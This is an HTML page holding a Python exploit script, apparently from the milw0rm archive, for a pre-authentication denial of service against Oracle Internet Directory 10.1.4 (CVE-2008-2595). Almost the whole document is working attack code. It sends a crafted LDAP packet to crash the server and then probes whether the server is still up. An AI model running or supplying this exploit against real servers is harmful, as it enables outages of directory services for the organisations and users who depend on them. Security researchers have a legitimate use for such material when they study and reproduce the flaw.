<html><head><title>Oracle Internet Directory 10.1.4 Remote Preauth DoS Exploit</title></head><pre>#!/usr/bin/python

&quot;&quot;&quot;
Oracle Internet Directory 10.1.4 preauthentication Denial Of Service

NOTES: Under 32 bits platforms it crashes immediately. Under 64 bits it may take even hours.
Sometimes you need 2 shoots to crash OID completely. The server &quot;commonly&quot; tolerates one
shoot, but even when you only send one packet it will crash.

Tested: Win2000 x86, WinXP x86, Win2003 X86_64

Vulnerability found by Joxean Koret (joxeankoret [ at ] yahoo DOT es)

Fixed: Oracle Critical Patch Update July 2008
CVEID: CVE-2008-2595
&quot;&quot;&quot;

import sys
import time
import socket

healthPacket = &quot;0%\\x02\\x01\\x01c \\x04\\x00\\n\\x01\\x02\\n\\x01\\x00\\x02\\x01\\x00\\x02\\x01\\x00\\x01\\x01\\x00\\x87\\x0bobjectClass0\\x00&quot;
packet = &quot;\x30\x0e\x02\x01\x01\x60\x09\x30\x01\x03\x04\x02\x44\x4e\x80\x00&quot;

def checkHealth(hostname, port):
    print &quot;  --&gt; Wating 5 seconds&quot;
    time.sleep(5)
    
    print &quot;  --&gt; Connecting to target...&quot;
    socket.setdefaulttimeout(5)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((hostname, port))

    try:
        print &quot;  --&gt; Sending 'health' packet ...&quot;
        s.sendall(healthPacket)
        print &quot;  --&gt; Trying to receive something...&quot;
        data = s.recv(1024)
    except:
        err = sys.exc_info()[1]

        if int(err[0]) == 104:
            print &quot;[+] Exploits works!&quot;
            return

    if data != &quot;&quot;:
        print &quot;[!] Server is up and running :(&quot;
    else:
        print &quot;[?] Server doesn't answer nothing. It works?&quot;

def oidDos(hostname, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        print &quot;[+] Connecting to ldap://%s:%d...&quot; % (hostname, port)
        s.connect((hostname, int(port)))

        print &quot;[+] Sending packet...&quot;
        s.sendall(packet)
        s.close()

        print &quot;[+] Checking OID's health...&quot;
        checkHealth(hostname, port)
    except:
        print sys.exc_info()[1]

def usage():
    print &quot;Oracle Internet Directory 10.1.4 Remote Preauthentication DOS&quot;
    print &quot;Copyright (c) 2007 Joxean Koret&quot;
    print
    print &quot;Usage:&quot;
    print sys.argv[0],&quot;-h&lt;hostname&gt; -p&lt;port&gt;&quot;
    print

def main():
    if len(sys.argv) != 3:
        usage()
        sys.exit(0)
    
    hostname = None
    port = None

    i = 0
    for param in sys.argv:
        i += 1
        
        if i == 1:
            continue
        
        if param.startswith(&quot;-h&quot;):
            hostname = param[2:]
        elif param.startswith(&quot;-p&quot;):
            port = int(param[2:])
        else:
            print &quot;Unknown option '%s'&quot; % param
            usage()
            sys.exit(1)
    
    if not hostname or not port:
        print &quot;Bad command line.&quot;
        usage()
        sys.exit(1)

    oidDos(hostname, port)

if __name__ == &quot;__main__&quot;:
    main()

# milw0rm.com [2008-07-19]</pre></html>